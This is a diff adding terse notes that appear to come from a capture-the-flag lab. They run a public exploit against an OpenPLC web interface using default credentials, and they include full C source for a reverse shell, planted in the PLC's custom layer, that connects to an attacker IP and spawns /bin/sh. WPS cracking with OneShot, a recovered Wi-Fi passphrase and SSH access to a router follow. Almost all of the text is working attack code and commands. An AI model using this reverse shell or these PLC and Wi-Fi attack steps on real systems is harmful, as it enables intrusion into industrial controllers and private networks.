@@ -1,0 +1,72 @@
+└─$ python3 49803.py -u http://10.10.11.7:8080 -l openplc -p openplc -i 10.10.14.5 -r 4444
+
+#include "ladder.h"
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+//-----------------------------------------------------------------------------
+
+//-----------------------------------------------------------------------------
+int ignored_bool_inputs[] = {-1};
+int ignored_bool_outputs[] = {-1};
+int ignored_int_inputs[] = {-1};
+int ignored_int_outputs[] = {-1};
+
+//-----------------------------------------------------------------------------
+
+//-----------------------------------------------------------------------------
+void initCustomLayer()
+{
+   
+    
+    
+}
+
+void updateCustomIn()
+{
+
+}
+
+void updateCustomOut()
+{
+    int port = 4444;
+    struct sockaddr_in revsockaddr;
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;       
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr("10.10.14.5");//your ip addr
+
+    connect(sockt, (struct sockaddr *) &revsockaddr, 
+    sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {"/bin/sh", NULL};
+    execve("/bin/sh", argv, NULL);
+
+    return 0;  
+    
+}
+
+
+
+iw dev wlan0 scan
+
+https://github.com/kimocoder/OneShot
+python3 oneshot.py -i wlan0 -K
+
+wpa_passphrase plcrouter 'NoWWEDoKnowWhaTisReal123!' > psk1
+wpa_supplicant -B -c psk1 -i wlan0
+ifconfig wlan0 192.168.1.5 netmask 255.255.255.0
+sudo ifconfig wlan0 up
+
+ssh 192.168.1.1
+
+
